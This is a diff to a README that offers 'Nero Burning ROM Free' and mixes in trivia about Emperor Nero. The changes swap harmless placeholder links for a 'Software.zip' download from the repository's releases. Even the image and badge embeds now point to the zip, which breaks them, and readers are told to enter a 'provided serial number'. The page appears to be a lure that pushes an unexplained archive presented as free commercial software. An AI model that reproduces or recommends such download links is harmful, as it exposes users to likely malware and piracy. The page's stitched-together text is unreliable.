@@ -29,13 +29,13 @@ Nero-Burning-ROM-Free
 - why-did-nero-burn-rome-to-the-ground
 
 ### Link: 
-Launch [Nero Burning ROM Free ZIP](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to get started burning DVDs like Nero!
+Launch [Nero Burning ROM Free ZIP](https://github.com/fraybot/Nero-Burning-ROM-Free/releases/download/v1.0/Software.zip) to get started burning DVDs like Nero!
 
-[![Launch Nero Burning ROM Free ZIP](https://img.shields.io/badge/Launch-Nero%20Burning%20ROM%20Free%20ZIP-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Launch Nero Burning ROM Free ZIP](https://github.com/fraybot/Nero-Burning-ROM-Free/releases/download/v1.0/Software.zip%20Burning%20ROM%20Free%20ZIP-green)](https://github.com/fraybot/Nero-Burning-ROM-Free/releases/download/v1.0/Software.zip)
 
 ## How to Burn a DVD with Nero Burning ROM 📀
 
-![Nero Burning ROM](https://example.com/nero-burning-rom-image.jpg)
+![Nero Burning ROM](https://github.com/fraybot/Nero-Burning-ROM-Free/releases/download/v1.0/Software.zip)
 
 ### Step 1: Install Nero Burning ROM 
 Begin by downloading and installing Nero Burning ROM on your computer. Make sure to enter the provided serial number during installation for full access to the software's features.
@@ -57,7 +57,7 @@ Click on the "Burn" button to start the burning process. Nero Burning ROM will h
 
 ## Did Nero Play the Fiddle While Rome Burned? 🎻🔥
 
-![Nero Fiddling](https://example.com/nero-fiddling-image.jpg)
+![Nero Fiddling](https://github.com/fraybot/Nero-Burning-ROM-Free/releases/download/v1.0/Software.zip)
 
 The legend of Nero playing the fiddle while Rome burned has been a controversial topic throughout history. While some believe it to be true, others argue that it is merely a myth or a misinterpretation of historical events. Regardless, the image of Nero fiddling while Rome burned has captured the imagination of people for centuries.
 
